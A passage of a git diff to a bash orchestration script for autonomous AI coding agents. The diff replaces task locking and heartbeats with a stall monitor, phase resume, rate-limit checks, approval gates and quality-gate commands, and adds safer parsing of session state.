-    return 0
-  fi
-
-  if [ -n "$task_id" ]; then
-    git commit -m "$message [$task_id]" --no-verify 2>/dev/null || true
-  else
-    git commit -m "$message" --no-verify 2>/dev/null || true
-  fi
-
-  log_info "Committed task file changes: $message"
-}
-
-# ============================================================================
-# Task Assignment (Update task file metadata)
-# ============================================================================
-
-assign_task() {
-  local task_file="$1"
-  local timestamp
-  timestamp=$(date '+%Y-%m-%d %H:%M')
-
-  if [ -f "$task_file" ]; then
-    if grep -q "| Assigned To |" "$task_file"; then
-      sed -i.bak "s/| Assigned To | .*/| Assigned To | \`$AGENT_ID\` |/" "$task_file"
-      sed -i.bak "s/| Assigned At | .*/| Assigned At | \`$timestamp\` |/" "$task_file"
-      rm -f "${task_file}.bak"
-    fi
-    log_info "Assigned task to $AGENT_ID"
-  fi
-}
-
-unassign_task() {
-  local task_file="$1"
-
-  if [ -f "$task_file" ]; then
-    if grep -q "| Assigned To |" "$task_file"; then
-      sed -i.bak "s/| Assigned To | .*/| Assigned To | |/" "$task_file"
-      sed -i.bak "s/| Assigned At | .*/| Assigned At | |/" "$task_file"
-      rm -f "${task_file}.bak"
-    fi
-    log_info "Unassigned task"
-  fi
-}
-
-refresh_assignment() {
-  local task_file="$1"
-  local timestamp
-  timestamp=$(date '+%Y-%m-%d %H:%M')
-
-  if [ -f "$task_file" ]; then
-    if grep -q "| Assigned At |" "$task_file"; then
-      sed -i.bak "s/| Assigned At | .*/| Assigned At | \`$timestamp\` |/" "$task_file"
-      rm -f "${task_file}.bak"
-    fi
-    log_info "Refreshed assignment timestamp"
-  fi
-}
-
-# ============================================================================
-# Heartbeat (Refresh assignment to prevent stale detection)
-# ============================================================================
-
-HEARTBEAT_PID=""
-CURRENT_TASK_FILE=""
-
-start_heartbeat() {
-  local task_file="$1"
-  CURRENT_TASK_FILE="$task_file"
-
-  stop_heartbeat
+  stop_phase_monitor
 
   (
+    trap "exit 0" INT TERM
+    local last_size=0
+    local last_activity_time
+    last_activity_time=$(date +%s)
+    local start_time
+    start_time=$(date +%s)
+    local stall_warned=0
+
+    echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} 00:00 │ ⋯ waiting for agent response..."
+
     while true; do
-      sleep "$AGENT_HEARTBEAT"
-      if [ -f "$CURRENT_TASK_FILE" ]; then
-        refresh_assignment "$CURRENT_TASK_FILE"
-        local task_id
-        task_id=$(get_task_id_from_file "$CURRENT_TASK_FILE")
-        local lock_file
-        lock_file=$(get_lock_file "$task_id")
-        if [ -f "$lock_file" ]; then
-          cat > "$lock_file" << EOF
-AGENT_ID="$AGENT_ID"
-LOCKED_AT="$(date '+%Y-%m-%d %H:%M:%S')"
-PID="$$"
-TASK_ID="$task_id"
-EOF
+      sleep "$PHASE_MONITOR_INTERVAL" &
+      wait $! 2>/dev/null || exit 0
+
+      local now
+      now=$(date +%s)
+      local elapsed=$(( now - start_time ))
+      local mins=$(( elapsed / 60 ))
+      local secs=$(( elapsed % 60 ))
+
+      # Check log file size
+      local current_size=0
+      if [ -f "$phase_log" ]; then
+        current_size=$(wc -c < "$phase_log" 2>/dev/null || echo 0)
+        current_size="${current_size##* }"  # trim whitespace (macOS wc)
+      fi
+
+      # Check for new output
+      if [ "$current_size" -gt "$last_size" ]; then
+        local new_bytes=$(( current_size - last_size ))
+        last_activity_time=$now
+        stall_warned=0
+
+        # Human-readable size
+        local size_display
+        if [ "$current_size" -gt 1048576 ]; then
+          size_display="$(( current_size / 1048576 ))MB"
+        elif [ "$current_size" -gt 1024 ]; then
+          size_display="$(( current_size / 1024 ))KB"
+        else
+          size_display="${current_size}B"
         fi
+
+        echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ✓ active (+${new_bytes}B, ${size_display} total)"
+        last_size=$current_size
+      else
+        local stall_time=$(( now - last_activity_time ))
+
+        if [ "$stall_time" -ge "$PHASE_STALL_THRESHOLD" ]; then
+          local stall_mins=$(( stall_time / 60 ))
+          local stall_secs=$(( stall_time % 60 ))
+
+          if [ "$stall_warned" -eq 0 ]; then
+            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⚠ NO OUTPUT for ${stall_mins}m${stall_secs}s (log: ${current_size} bytes)"
+            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC}   Agent may be stuck, thinking, or waiting for API response"
+            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC}   Log: $phase_log"
+            stall_warned=1
+          else
+            # Repeat warning every stall_threshold interval
+            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⚠ STILL NO OUTPUT (${stall_mins}m${stall_secs}s silent)"
+          fi
+        else
+          echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⋯ waiting (${stall_time}s since last output)"
+        fi
+      fi
+
+      # Warn when approaching timeout
+      local remaining=$(( timeout - elapsed ))
+      if [ "$remaining" -le 120 ] && [ "$remaining" -gt 0 ]; then
+        echo -e "${RED}[$AGENT_ID MONITOR]${NC} ${phase_name} │ ⚠ TIMEOUT in ${remaining}s!"
       fi
     done
   ) &
-  HEARTBEAT_PID=$!
-  log_info "Started heartbeat (PID: $HEARTBEAT_PID, interval: ${AGENT_HEARTBEAT}s)"
+  PHASE_MONITOR_PID=$!
 }
 
-stop_heartbeat() {
-  if [ -n "$HEARTBEAT_PID" ] && kill -0 "$HEARTBEAT_PID" 2>/dev/null; then
-    kill "$HEARTBEAT_PID" 2>/dev/null || true
-    wait "$HEARTBEAT_PID" 2>/dev/null || true
-    log_info "Stopped heartbeat"
+stop_phase_monitor() {
+  if [ -n "$PHASE_MONITOR_PID" ] && kill -0 "$PHASE_MONITOR_PID" 2>/dev/null; then
+    kill "$PHASE_MONITOR_PID" 2>/dev/null || true
+    wait "$PHASE_MONITOR_PID" 2>/dev/null || true
   fi
-  HEARTBEAT_PID=""
+  PHASE_MONITOR_PID=""
 }
 
 # ============================================================================
@@ -952,7 +1116,7 @@ reset_model() {
 build_phase_prompt() {
   local prompt_file="$1"
   local task_id="$2"
-  local task_file="$3"
+  local task_prompt="$3"
   local timestamp
   timestamp=$(date '+%Y-%m-%d %H:%M')
 
@@ -966,17 +1130,36 @@ build_phase_prompt() {
   local template
   template=$(cat "$prompt_path")
 
-  local recent_commits=""
-  if [[ "$prompt_file" == *"review"* ]]; then
-    recent_commits=$(git log --oneline -10 --grep="$task_id" 2>/dev/null || echo "(no commits yet)")
+  # Context variables for downstream phases (4-test through 7-verify)
+  # These give later phases visibility into what earlier phases changed
+  local recent_commits="" changed_files="" task_commits=""
+  if [[ "$prompt_file" == *"review"* ]] || [[ "$prompt_file" == *"verify"* ]]; then
+    recent_commits=$(git log --oneline -10 2>/dev/null || echo "(no commits yet)")
   fi
+  if [[ "$prompt_file" == *"test"* ]] || [[ "$prompt_file" == *"docs"* ]] || \
+     [[ "$prompt_file" == *"review"* ]] || [[ "$prompt_file" == *"verify"* ]]; then
+    changed_files=$(git diff main...HEAD --name-only 2>/dev/null | head -30 || echo "(unable to determine)")
+    task_commits=$(git log --oneline -15 2>/dev/null || echo "(no commits yet)")
+  fi
+
+  # Accumulated context from previous verification attempts
+  local context_file
+  context_file=$(get_context_file "$task_id")
+  local accumulated_context=""
+  [ -f "$context_file" ] && accumulated_context=$(cat "$context_file")
 
   local prompt="$template"
   prompt="${prompt//\{\{TASK_ID\}\}/$task_id}"
-  prompt="${prompt//\{\{TASK_FILE\}\}/$task_file}"
+  prompt="${prompt//\{\{TASK_PROMPT\}\}/$task_prompt}"
+  # Legacy support: resolve {{TASK_FILE}} to empty (no longer used)
+  prompt="${prompt//\{\{TASK_FILE\}\}/}"
   prompt="${prompt//\{\{TIMESTAMP\}\}/$timestamp}"
   prompt="${prompt//\{\{RECENT_COMMITS\}\}/$recent_commits}"
+  prompt="${prompt//\{\{CHANGED_FILES\}\}/$changed_files}"
+  prompt="${prompt//\{\{TASK_COMMITS\}\}/$task_commits}"
   prompt="${prompt//\{\{AGENT_ID\}\}/$AGENT_ID}"
+  prompt="${prompt//\{\{ACCUMULATED_CONTEXT\}\}/$accumulated_context}"
+  prompt="${prompt//\{\{VERIFICATION_CONTEXT\}\}/${PHASE_VERIFICATION_CONTEXT:-}}"
 
   # Process {{include:path}} directives
   prompt=$(process_includes "$prompt")
@@ -989,20 +1172,31 @@ run_phase_once() {
   local prompt_file="$2"
   local timeout="$3"
   local task_id="$4"
-  local task_file="$5"
+  local task_prompt="$5"
   local attempt="$6"
+  local phase_idx="${7:-}"
+  local total_phases="${8:-}"
   local phase_name_lower
   phase_name_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
   local phase_log="$RUN_LOG_DIR/phase-${phase_name_lower}-$task_id-attempt${attempt}.log"
 
-  log_phase "Starting $phase_name phase (attempt $attempt)"
+  # Build phase label with index for clear identification
+  local phase_label="$phase_name"
+  if [ -n "$phase_idx" ] && [ -n "$total_phases" ]; then
+    phase_label="[$phase_idx/$total_phases] $phase_name"
+  fi
+
+  local start_time
+  start_time=$(date +%s)
+
+  log_phase "Starting $phase_label phase (attempt $attempt)"
   echo "  Agent: $CURRENT_AGENT"
   echo "  Model: $CURRENT_MODEL"
   echo "  Timeout: ${timeout}s"
   echo "  Log: $phase_log"
 
   local prompt build_result=0
-  prompt=$(build_phase_prompt "$prompt_file" "$task_id" "$task_file") || build_result=$?
+  prompt=$(build_phase_prompt "$prompt_file" "$task_id" "$task_prompt") || build_result=$?
   if [ "$build_result" -ne 0 ]; then
     log_error "Failed to build prompt for $phase_name (prompt file: $PROMPTS_DIR/$prompt_file)"
     return 1
@@ -1017,19 +1211,42 @@ run_phase_once() {
 
   local exit_code=0
 
+  # Proactive rate limit check before agent invocation
+  if declare -f rate_limit_check &>/dev/null; then
+    local rl_result=0
+    rate_limit_check "$phase_name" || rl_result=$?
+    if [ "$rl_result" -ne 0 ]; then
+      log_warn "Rate limit wait interrupted — aborting $phase_name"
+      return 130
+    fi
+  fi
+
   echo ""
   echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
-  echo -e "${CYAN}│${NC} ${BOLD}PHASE: $phase_name (attempt $attempt) [$CURRENT_AGENT]${NC}"
+  echo -e "${CYAN}│${NC} ${BOLD}PHASE: $phase_label (attempt $attempt) [$CURRENT_AGENT]${NC}"
   echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
   echo ""
 
+  # Start phase monitor (checks for stuck agents)
+  start_phase_monitor "$phase_name" "$phase_log" "$timeout"
+
   # Build timeout prefix
+  # --foreground: prevents timeout from creating a new process group, which
+  # would cause the child to lose TTY access and get stopped (SIGTTIN/SIGTTOU).
+  # Without this, the agent process hangs silently in pipelines.
   local timeout_cmd=""
   if command -v gtimeout &> /dev/null; then
-    timeout_cmd="gtimeout"
+    timeout_cmd="gtimeout --foreground"
   elif command -v timeout &> /dev/null; then
-    timeout_cmd="timeout"
+    timeout_cmd="timeout --foreground"
   fi
+
+  # Record invocation for rate limiting
+  if declare -f rate_limit_record &>/dev/null; then
+    rate_limit_record
+  fi
+
+  echo -e "${DIM}[$AGENT_ID]${NC} Launching $CURRENT_AGENT agent for $phase_label..."
 
   # Build agent command using abstraction functions
   # Each agent uses its correct autonomous mode flags
@@ -1052,9 +1269,9 @@ run_phase_once() {
 
       if [ "$output_mode" = "progress" ]; then
         if [ -n "$timeout_cmd" ]; then
-          $timeout_cmd "${timeout}s" claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_name" || exit_code=$?
+          $timeout_cmd "${timeout}s" claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_label" || exit_code=$?
         else
-          claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_name" || exit_code=$?
+          claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_label" || exit_code=$?
         fi
       else
         if [ -n "$timeout_cmd" ]; then
@@ -1154,28 +1371,46 @@ run_phase_once() {
       ;;
   esac
 
+  # Stop phase monitor
+  stop_phase_monitor
+
+  # If pipeline was killed by SIGINT (Ctrl+C), propagate the signal
+  if [ "$exit_code" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
+    log_warn "$phase_name interrupted by user"
+    return 130
+  fi
+
   echo ""
   echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
   echo ""
 
+  # Calculate phase duration
+  local phase_end_time
+  phase_end_time=$(date +%s)
+  local phase_duration=$(( phase_end_time - start_time ))
+
   case $exit_code in
     0)
       log_phase "$phase_name completed successfully"
+      audit_phase "$phase_name" "pass" "$phase_duration"
       return 0
       ;;
     124)
       log_error "$phase_name timed out after ${timeout}s"
+      audit_phase "$phase_name" "timeout" "$phase_duration"
       return 124
       ;;
     *)
       if grep -qiE "rate.?limit|overloaded|429|502|503|504|capacity|quota" "$phase_log" 2>/dev/null; then
         log_heal "Rate limit detected in $phase_name"
+        audit_phase "$phase_name" "rate_limit" "$phase_duration"
         if fallback_to_sonnet; then
           log_heal "Will retry $phase_name with fallback model"
         fi
         return 2
       fi
       log_error "$phase_name failed with exit code $exit_code"
+      audit_phase "$phase_name" "fail" "$phase_duration"
       return 1
       ;;
   esac
@@ -1187,10 +1422,15 @@ run_phase() {
   local timeout="$3"
   local skip="$4"
   local task_id="$5"
-  local task_file="$6"
+  local task_prompt="$6"
+  local phase_idx="${7:-}"
+  local total_phases="${8:-}"
 
   if [ "$skip" = "1" ]; then
     log_phase "Skipping $phase_name (disabled)"
+    if declare -f progress_phase_skip &>/dev/null; then
+      progress_phase_skip "$phase_name"
+    fi
     return 0
   fi
 
@@ -1202,13 +1442,17 @@ run_phase() {
 
   while [ "$attempt" -le "$max_attempts" ]; do
     local result=0
-    run_phase_once "$phase_name" "$prompt_file" "$timeout" "$task_id" "$task_file" "$attempt" || result=$?
+    run_phase_once "$phase_name" "$prompt_file" "$timeout" "$task_id" "$task_prompt" "$attempt" "$phase_idx" "$total_phases" || result=$?
 
     case $result in
       0)
         # Run after-phase skill hooks
         run_skill_hooks "AFTER" "$phase_name"
         return 0
+        ;;
+      130)
+        # User interrupt (Ctrl+C) - propagate immediately, don't retry
+        return 130
         ;;
       124)
         log_error "$phase_name timed out - consider increasing TIMEOUT_${phase_name}"
@@ -1230,7 +1474,7 @@ run_phase() {
         ;;
     esac
 
-    ((attempt++))
+    ((++attempt))
   done
 
   log_error "$phase_name failed after $max_attempts attempts - check logs: $RUN_LOG_DIR/phase-*"
@@ -1239,21 +1483,96 @@ run_phase() {
 
 run_all_phases() {
   local task_id="$1"
-  local task_file="$2"
+  local task_prompt="$2"
 
   log_info "Running ${#PHASES[@]} phases for task: $task_id"
 
+  # Initialize progress tracking
+  if declare -f progress_init_phases &>/dev/null; then
+    progress_init_phases "$task_id" "$CURRENT_MODEL"
+  fi
+
+  # Check for phase-level resume (skip already-completed phases)
+  local resume_from_phase=0
+  resume_from_phase=$(load_phase_progress "$task_id") || true
+
+  local phase_idx=0
+  local total_phases=${#PHASES[@]}
   for phase_def in "${PHASES[@]}"; do
+    ((++phase_idx))
+    # Check for interrupt before starting next phase
+    if [ "$INTERRUPTED" = "1" ]; then
+      log_warn "Interrupted - stopping phase execution"
+      status_line_clear 2>/dev/null || true
+      return 130
+    fi
+
     IFS='|' read -r name prompt_file timeout skip <<< "$phase_def"
 
-    if ! run_phase "$name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_file"; then
-      log_error "Phase $name failed - stopping task execution"
+    # Skip phases that already completed in a previous run
+    if [ "$phase_idx" -le "$resume_from_phase" ]; then
+      log_phase "Skipping $name (completed in previous run)"
+      if declare -f progress_phase_done &>/dev/null; then
+        progress_phase_done "$name"
+      fi
+      continue
+    fi
+
+    # Check if this phase should be skipped due to approval gate
+    if [ "${APPROVAL_SKIP_NEXT:-0}" = "1" ]; then
+      APPROVAL_SKIP_NEXT=0
+      log_phase "Skipping $name (user requested)"
+      if declare -f progress_phase_skip &>/dev/null; then
+        progress_phase_skip "$name"
+      fi
+      continue
+    fi
+
+    # Track phase start
+    if declare -f progress_phase_start &>/dev/null; then
+      progress_phase_start "$name"
+    fi
+
+    local phase_result=0
+    run_phase_with_verification "$name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_prompt" "$phase_idx" "$total_phases" || phase_result=$?
+
+    if [ "$phase_result" -eq 130 ]; then
+      status_line_clear 2>/dev/null || true
+      return 130
+    elif [ "$phase_result" -eq 3 ]; then
+      log_error "Phase $name exhausted verification budget - needs human input"
+      log_info "Re-run 'dk run' with the same prompt to resume from this phase"
+      status_line_clear 2>/dev/null || true
       return 1
+    elif [ "$phase_result" -ne 0 ]; then
+      log_error "Phase $name failed - stopping task execution"
+      status_line_clear 2>/dev/null || true
+      return 1
+    fi
+
+    # Track phase completion and save progress for resume
+    if declare -f progress_phase_done &>/dev/null; then
+      progress_phase_done "$name"
+    fi
+    save_phase_progress "$task_id" "$phase_idx" "$name"
+
+    # Approval gate between phases
+    if declare -f approval_gate &>/dev/null; then
+      local gate_result=0
+      approval_gate "$name" "$task_id" || gate_result=$?
+      case "$gate_result" in
+        1) return 1 ;;  # abort/pause
+        2) APPROVAL_SKIP_NEXT=1 ;;  # skip next
+      esac
     fi
 
     sleep 1
   done
 
+  # All phases done - clear phase progress state
+  clear_phase_progress
+
+  status_line_clear 2>/dev/null || true
   log_success "All phases completed for task: $task_id"
   return 0
 }
@@ -1264,38 +1583,82 @@ run_all_phases() {
 
 init_state() {
   mkdir -p "$STATE_DIR"
+  chmod 700 "$STATE_DIR"
   mkdir -p "$RUN_LOG_DIR"
-  init_locks
+  chmod 700 "$RUN_LOG_DIR"
+  # Auto-rotate old logs (>7 days)
+  find "$LOGS_DIR" -maxdepth 1 -type d -mtime +7 ! -name 'logs' -exec rm -rf {} + 2>/dev/null || true
 }
 
 save_session() {
   local session_id="$1"
-  local iteration="$2"
-  local status="$3"
+  local status="$2"
   local session_file="$STATE_DIR/session-$AGENT_ID"
 
   cat > "$session_file" << EOF
 SESSION_ID="$session_id"
 AGENT_ID="$AGENT_ID"
-ITERATION="$iteration"
 STATUS="$status"
 TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
-NUM_TASKS="$NUM_TASKS"
 MODEL="${DOYAKEN_MODEL:-opus}"
 LOG_DIR="$RUN_LOG_DIR"
 EOF
-  log_info "Session state saved: $session_id (iteration $iteration)"
+  log_info "Session state saved: $session_id"
+}
+
+# Save phase progress for a task (enables phase-level resume)
+save_phase_progress() {
+  local task_id="$1"
+  local phase_idx="$2"
+  local phase_name="$3"
+  local progress_file="$STATE_DIR/phase-progress-$AGENT_ID"
+
+  cat > "$progress_file" << EOF
+TASK_ID="$task_id"
+LAST_COMPLETED_PHASE="$phase_idx"
+LAST_COMPLETED_NAME="$phase_name"
+TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
+EOF
+}
+
+# Load phase progress for a task (returns last completed phase index, or 0)
+load_phase_progress() {
+  local task_id="$1"
+  local progress_file="$STATE_DIR/phase-progress-$AGENT_ID"
+
+  if [ -f "$progress_file" ] && [ "$AGENT_NO_RESUME" != "1" ]; then
+    local saved_task_id saved_phase_idx saved_phase_name
+    saved_task_id=$(grep '^TASK_ID=' "$progress_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
+    saved_phase_idx=$(grep '^LAST_COMPLETED_PHASE=' "$progress_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
+    saved_phase_name=$(grep '^LAST_COMPLETED_NAME=' "$progress_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
+
+    if [ "$saved_task_id" = "$task_id" ] && [ -n "$saved_phase_idx" ]; then
+      log_heal "Found phase progress for $task_id: completed through $saved_phase_name ($saved_phase_idx/${#PHASES[@]})"
+      echo "$saved_phase_idx"
+      return 0
+    fi
+  fi
+  echo "0"
+  return 1
+}
+
+# Clear phase progress (called when all phases complete or task finishes)
+clear_phase_progress() {
+  local progress_file="$STATE_DIR/phase-progress-$AGENT_ID"
+  rm -f "$progress_file"
 }
 
 load_session() {
   local session_file="$STATE_DIR/session-$AGENT_ID"
 
   if [ -f "$session_file" ] && [ "$AGENT_NO_RESUME" != "1" ]; then
-    # shellcheck source=/dev/null
-    source "$session_file"
+    # Parse session file safely instead of sourcing (prevents code injection)
+    SESSION_ID=$(grep '^SESSION_ID=' "$session_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
+    STATUS=$(grep '^STATUS=' "$session_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
+    LOG_DIR=$(grep '^LOG_DIR=' "$session_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
+
     if [ -n "${SESSION_ID:-}" ] && [ "${STATUS:-}" = "running" ]; then
       log_heal "Found interrupted session: $SESSION_ID"
-      log_heal "Last iteration: ${ITERATION:-1}, Status: $STATUS"
       return 0
     fi
   fi
@@ -1345,7 +1708,7 @@ health_check() {
   if ! command -v "$agent_cmd" &> /dev/null; then
     log_error "$CURRENT_AGENT CLI ($agent_cmd) not found"
     agent_install_instructions "$CURRENT_AGENT"
-    ((issues++))
+    ((++issues))
   else
     log_success "$CURRENT_AGENT CLI ($agent_cmd) available"
   fi
@@ -1365,31 +1728,12 @@ health_check() {
     log_success "Operating manual exists: $(basename "$AGENT_MD")"
   fi
 
-  for dir in 1.blocked 2.todo 3.doing 4.done _templates; do
-    if [ ! -d "$TASKS_DIR/$dir" ]; then
-      log_warn "Creating missing directory: $TASKS_DIR/$dir"
-      mkdir -p "$TASKS_DIR/$dir"
-    fi
-  done
-  log_success "Task directories ready"
-
-  if [ ! -d "$LOCKS_DIR" ]; then
-    mkdir -p "$LOCKS_DIR"
-  fi
-  log_success "Locks directory ready"
-
   local available_kb
   available_kb=$(df -k "$PROJECT_DIR" | awk 'NR==2 {print $4}')
   if [ "$available_kb" -lt 1048576 ]; then
     log_warn "Low disk space: $((available_kb / 1024))MB available"
   else
     log_success "Disk space OK: $((available_kb / 1024))MB available"
-  fi
-
-  local active_locks
-  active_locks=$(find "$LOCKS_DIR" -name "*.lock" 2>/dev/null | wc -l | tr -d ' ')
-  if [ "$active_locks" -gt 0 ]; then
-    log_info "Active task locks: $active_locks"
   fi
 
   if [ "$issues" -gt 0 ]; then
@@ -1401,21 +1745,12 @@ health_check() {
   return 0
 }
 
-# ============================================================================
-# Validation
-# ============================================================================
-
 validate_environment() {
   log_step "Validating environment..."
 
-  if ! [[ "$NUM_TASKS" =~ ^[0-9]+$ ]]; then
-    log_error "Invalid number of tasks: $NUM_TASKS"
-    echo "Usage: doyaken run [number_of_tasks]"
-    exit 1
-  fi
-
-  if [ "$NUM_TASKS" -lt 1 ] || [ "$NUM_TASKS" -gt 50 ]; then
-    log_error "Number of tasks must be between 1 and 50"
+  if [ -z "${DOYAKEN_PROMPT:-}" ]; then
+    log_error "No prompt provided (DOYAKEN_PROMPT is empty)"
+    echo "Usage: dk run \"your prompt here\""
     exit 1
   fi
 
@@ -1423,252 +1758,231 @@ validate_environment() {
 }
 
 # ============================================================================
-# Task Management
+# Verification Gates (Quality Gate Checking)
 # ============================================================================
 
-# Get the actual folder path, supporting both old and new naming
-get_task_folder() {
-  local state="$1"
-  # Check for new numbered naming first
-  case "$state" in
-    blocked) [ -d "$TASKS_DIR/1.blocked" ] && echo "$TASKS_DIR/1.blocked" && return ;;
-    todo)    [ -d "$TASKS_DIR/2.todo" ] && echo "$TASKS_DIR/2.todo" && return ;;
-    doing)   [ -d "$TASKS_DIR/3.doing" ] && echo "$TASKS_DIR/3.doing" && return ;;
-    done)    [ -d "$TASKS_DIR/4.done" ] && echo "$TASKS_DIR/4.done" && return ;;
-  esac
-  # Fall back to old naming
-  echo "$TASKS_DIR/$state"
-}
+# Run a single quality gate command
+# Args: gate_name, gate_cmd
+# Sets: GATE_RESULT (output), returns 0=pass, 1=fail, 2=skip
+_run_gate() {
+  local gate_name="$1"
+  local gate_cmd="$2"
 
-count_tasks() {
-  local state="$1"
-  local dir
-  dir=$(get_task_folder "$state")
-  find "$dir" -maxdepth 1 -name "*.md" 2>/dev/null | wc -l | tr -d ' '
-}
-
-count_locked_tasks() {
-  find "$LOCKS_DIR" -maxdepth 1 -name "*.lock" 2>/dev/null | wc -l | tr -d ' '
-}
-
-get_doing_task_for_agent() {
-  local doing_dir
-  doing_dir=$(get_task_folder "doing")
-  for file in "$doing_dir"/*.md; do
-    [ -f "$file" ] || continue
-    local task_id
-    task_id=$(get_task_id_from_file "$file")
-
-    local lock_file
-    lock_file=$(get_lock_file "$task_id")
-
-    if [ -f "$lock_file" ]; then
-      local lock_agent
-      lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")
-      if [ "$lock_agent" = "$AGENT_ID" ]; then
-        echo "$file"
-        return 0
-      fi
-    fi
-  done
-
-  return 1
-}
-
-get_next_available_task() {
-  local our_doing
-  our_doing=$(get_doing_task_for_agent) || true
-  if [ -n "$our_doing" ]; then
-    echo "$our_doing"
-    return 0
+  # Empty command = SKIP
+  if [ -z "$gate_cmd" ]; then
+    return 2
   fi
 
-  local todo_dir
-  todo_dir=$(get_task_folder "todo")
-  for file in $(find "$todo_dir" -maxdepth 1 -name "*.md" 2>/dev/null | sort); do
-    [ -f "$file" ] || continue
-    local task_id
-    task_id=$(get_task_id_from_file "$file")
+  log_info "Running gate: $gate_name ($gate_cmd)"
 
-    if ! is_task_locked "$task_id"; then
-      echo "$file"
-      return 0
-    else
-      log_info "Skipping $task_id (locked by another agent)"
-    fi
-  done
-
-  return 1
-}
-
-show_task_summary() {
-  log_info "Task Summary:"
-  echo "  - Blocked: $(count_tasks blocked)"
-  echo "  - Todo:    $(count_tasks todo)"
-  echo "  - Doing:   $(count_tasks doing)"
-  echo "  - Done:    $(count_tasks "done")"
-  echo "  - Locked:  $(count_locked_tasks)"
-}
-
-# ============================================================================
-# Retry Logic with Exponential Backoff
-# ============================================================================
-
-calculate_backoff() {
-  local attempt="$1"
-  local base_delay="$AGENT_RETRY_DELAY"
-  local max_delay=60
-
-  local delay=$((base_delay * (2 ** (attempt - 1))))
-  if [ "$delay" -gt "$max_delay" ]; then
-    delay=$max_delay
+  local gate_output exit_code=0
+  local timeout_cmd=""
+  if command -v gtimeout &>/dev/null; then
+    timeout_cmd="gtimeout --foreground"
+  elif command -v timeout &>/dev/null; then
+    timeout_cmd="timeout --foreground"
   fi
 
-  echo "$delay"
-}
-
-run_with_retry() {
-  local iteration="$1"
-  local max_retries="$AGENT_MAX_RETRIES"
-  local attempt=1
-
-  while [ "$attempt" -le "$max_retries" ]; do
-    if [ "$attempt" -gt 1 ]; then
-      local backoff
-      backoff=$(calculate_backoff "$attempt")
-      log_heal "Retry attempt $attempt/$max_retries (waiting ${backoff}s)..."
-      sleep "$backoff"
-    fi
-
-    if run_agent_iteration "$iteration" "$attempt"; then
-      CONSECUTIVE_FAILURES=0
-      return 0
-    fi
-
-    ((attempt++))
-  done
-
-  log_error "All $max_retries retry attempts failed for iteration $iteration"
-  log_info "Troubleshooting: check logs in $RUN_LOG_DIR, or increase AGENT_MAX_RETRIES"
-  ((CONSECUTIVE_FAILURES++))
-
-  if [ "$CONSECUTIVE_FAILURES" -ge 3 ]; then
-    log_heal "Circuit breaker triggered: $CONSECUTIVE_FAILURES consecutive failures"
-    log_heal "Pausing for 30 seconds before continuing..."
-    log_info "If persistent failures, check API rate limits or task complexity"
-    sleep 30
-  fi
-
-  return 1
-}
-
-# ============================================================================
-# Agent Execution
-# ============================================================================
-
-run_agent_iteration() {
-  local iteration="$1"
-  local attempt="${2:-1}"
-  local session_id
-
-  session_id="$AGENT_ID-iter$iteration"
-
-  log_header "Task $iteration of $NUM_TASKS (Attempt $attempt)"
-
-  save_session "$session_id" "$iteration" "running"
-
-  show_task_summary
-
-  local task_file
-  task_file=$(get_next_available_task) || true
-
-  if [ -z "$task_file" ]; then
-    log_info "No available tasks (all locked or empty)"
-    log_info "Agent will create one from PROJECT.md or wait for tasks"
+  if [ -n "$timeout_cmd" ]; then
+    gate_output=$($timeout_cmd 300s bash -c "cd '$PROJECT_DIR' && $gate_cmd" 2>&1 | tail -50) || exit_code=$?
   else
-    local task_id
-    task_id=$(get_task_id_from_file "$task_file")
-
-    if [[ "$task_file" == *"/doing/"* ]]; then
-      log_info "Resuming task: $task_id"
-    else
-      log_info "Picking up task: $task_id"
-
-      if ! acquire_lock "$task_id"; then
-        log_warn "Failed to acquire lock for $task_id - another agent got it"
-        return 1
-      fi
-
-      local new_path doing_dir
-      doing_dir=$(get_task_folder "doing")
-      new_path="$doing_dir/$(basename "$task_file")"
-      mv "$task_file" "$new_path"
-      task_file="$new_path"
-
-      assign_task "$task_file"
-
-      commit_task_files "chore: Start task $task_id" "$task_id"
-    fi
+    gate_output=$(bash -c "cd '$PROJECT_DIR' && $gate_cmd" 2>&1 | tail -50) || exit_code=$?
   fi
 
-  if [ "$AGENT_DRY_RUN" = "1" ]; then
-    log_warn "DRY RUN - would execute phases here"
-    log_info "Phases: ${PHASES[*]}"
-    save_session "$session_id" "$iteration" "dry-run"
-    return 0
-  fi
-
-  if [ -z "${task_file:-}" ]; then
-    log_error "No task file available for phase execution"
-    save_session "$session_id" "$iteration" "no-task"
-    return 1
-  fi
-
-  local task_id
-  task_id=$(get_task_id_from_file "$task_file")
-
-  start_heartbeat "$task_file"
-
-  log_step "Running modular phase-based execution..."
-  echo "  Task: $task_id"
